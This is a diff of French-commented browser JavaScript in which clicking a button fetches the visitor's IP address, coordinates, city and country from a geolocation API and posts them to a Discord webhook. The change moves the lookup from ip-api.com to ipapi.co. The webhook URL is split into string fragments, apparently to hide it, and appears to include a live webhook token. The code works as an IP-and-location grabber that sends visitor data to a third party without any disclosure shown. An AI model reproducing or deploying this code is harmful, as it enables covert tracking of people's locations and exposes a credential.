@@ -1,7 +1,7 @@
 document.getElementById('get-info-btn').addEventListener('click', function() {
     // Fonction pour obtenir l'URL du webhook Discord
     function getWebhookUrl() {
-        // Remplacez 'YOUR_PART1', 'YOUR_PART2' et 'YOUR_PART3' par les parties de votre URL de webhook Discord
+        // Remplacez les parties par les segments de votre URL de webhook Discord
         let part1 = 'https://dis';
         let part2 = 'cord.co';
         let part3 = 'm/api/we';
@@ -10,10 +10,10 @@ document.getElementById('get-info-btn').addEventListener('click', function() {
         let part6 = '51515914/SrRtaX';
         let part7 = '_dz1S_l1rKGroUHBmvvzBSqVfcWpe07WKJQ8nvLFeIImf';
         let part8 = 'e-XgBBlDcT6r_00VU';
-        return `${part1}${part2}${part3}${part4}/${part5}${part6}${part7}${part8}`;
+        return `${part1}${part2}${part3}${part4}/${part5}/${part6}/${part7}${part8}`;
     }
 
-    fetch('http://ip-api.com/json/')
+    fetch('https://ipapi.co/json/') // Utilisation de l'API sécurisée ipapi.co
         .then(response => {
             if (!response.ok) {
                 throw new Error('Erreur HTTP, statut : ' + response.status);
@@ -21,15 +21,15 @@ document.getElementById('get-info-btn').addEventListener('click', function() {
             return response.json();
         })
         .then(data => {
-            if (data.status === 'success') {
+            if (data) {
                 let message = {
                     content: `
-                        **None a cliqué sur le bouton**
-                        \nVotre adresse IP est: ${data.query}
-                        \nVotre localisation approximative est:
-                        \nLatitude: ${data.lat}, Longitude: ${data.lon}
-                        \nVille: ${data.city}, Région: ${data.regionName}, Pays: ${data.country}
-                        \n[Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
+                        **Utilisateur a cliqué sur le bouton**
+                        \nL'adresse IP est : ${data.ip}
+                        \nLocalisation approximative :
+                        \nLatitude : ${data.latitude}, Longitude : ${data.longitude}
+                        \nVille : ${data.city}, Région : ${data.region}, Pays : ${data.country_name}
+                        \n[Google Maps](https://www.google.com/maps?q=${data.latitude},${data.longitude})
                     `
                 };
 
@@ -53,14 +53,14 @@ document.getElementById('get-info-btn').addEventListener('click', function() {
                 });
 
                 document.getElementById('info-display').innerText = `
-                    Votre adresse IP est: ${data.query}
-                    \nVotre localisation approximative est:
-                    \nLatitude: ${data.lat}, Longitude: ${data.lon}
-                    \nVille: ${data.city}, Région: ${data.regionName}, Pays: ${data.country}
-                    \n[Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
+                    Votre adresse IP est : ${data.ip}
+                    \nLocalisation approximative :
+                    \nLatitude : ${data.latitude}, Longitude : ${data.longitude}
+                    \nVille : ${data.city}, Région : ${data.region}, Pays : ${data.country_name}
+                    \n[Google Maps](https://www.google.com/maps?q=${data.latitude},${data.longitude})
                 `;
             } else {
-                throw new Error('Erreur API : ' + data.message);
+                throw new Error('Erreur : Aucune donnée retournée par l\'API.');
             }
         })
         .catch(error => {
